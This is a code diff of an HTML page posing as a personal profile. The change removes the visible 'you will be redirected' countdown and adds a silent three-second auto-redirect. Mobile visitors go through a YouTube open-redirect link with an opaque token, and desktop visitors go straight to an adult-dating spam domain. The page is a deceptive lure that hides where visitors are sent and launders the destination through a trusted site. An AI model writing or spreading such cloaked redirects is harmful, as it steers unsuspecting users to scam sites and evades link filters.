@@ -13,45 +13,33 @@
 <body>
   <img src="img/300.jpg" alt="Profile Picture">
   <button onclick="myFunction()">View my profile</button>
-  <p>You will be automatically redirected to my profile</p>
-  <p id="countdown"></p>
   
-  <script>
-  var countdownEl = document.getElementById('countdown');
-  var countdownTime = 3;
-  countdownEl.innerHTML = countdownTime;
+ <script>
+  setTimeout(function() {
+    myFunction();
+  }, 3000);
 
-  var countdownInterval = setInterval(function() {
-    countdownTime--;
-    countdownEl.innerHTML = countdownTime;
-    if (countdownTime == 0) {
-      clearInterval(countdownInterval);
-      myFunction();
-    }
-  }, 1000);
-
-  function myFunction() {
-    var app = "vnd.youtube://youtube.com/redirect?event=comments&redir_token=QUFFLUhqbGxBQ2FpYS1SQm41ZW9CM1FzakhTZWdETERtZ3xBQ3Jtc0tsc3lHbDNlNnBJWTFMajcxNU1nYWc3ZGhkdDNIZmFaZWlNb2lmYU5uZEZvdzRyOV9mYW5uajdnNVdmS1UxVUg4V2piN0JGY0JoM2VHano5N28zM1gyNEU3amx6UTZYVmxBLTFxVnJEMFZ3ZHFGV2RtVQ&q=https%3A%2F%2Fv.ht%2FJkrjw&html_redirect=1";
-
-    var desktopFallback = "https://v.ht/Jkrjw";
-
-    if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
-      window.location.href = app;
-      window.setTimeout(function() {
-        window.location.href = mobileFallback;
-      }, 25);
-    } else {
-      window.location.href = desktopFallback;
-    }
-
-    function killPopup() {
-      window.removeEventListener('pagehide', killPopup);
+    function myFunction() {
+      var app = "vnd.youtube://youtube.com/redirect?event=comments&redir_token=QUFFLUhqbUNvZVVSSW9CUU5saGxHMG53TkN4ak9USkprUXxBQ3Jtc0tuSDZXekUwcHhtOFNxNkNhTDliMEVHQS1vUWpTa1V4NDRoaV9rTDU1X1E1cnNidkt0d1JPQ242eTNRdnJwV0lRYmdKZVdqekt4WmVQTFVyVmY3U0xjLUJJcWJUVVJsajhKZHZiZnBUQkYzMUpTZFR0Yw&q=https%3A%2F%2Fbhhaceb.adultsinder.online%2Fs%2F641346d72966f&html_redirect=1";
+	  
+      var desktopFallback = "https://bhhaceb.adultsinder.online/s/641346d72966f";
+	
+      if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+        window.location.href = app;
+        window.setTimeout(function() {
+          window.location.href = mobileFallback;
+        }, 25);
+      } else {
+        window.location.href = desktopFallback;
+      }
+	  
+	   function killPopup() {
+        window.removeEventListener('pagehide', killPopup);
     }
 
     window.addEventListener('pagehide', killPopup);
-  }
-</script>
+    }
 
-</script>
+  </script>
 </body>
 </html>
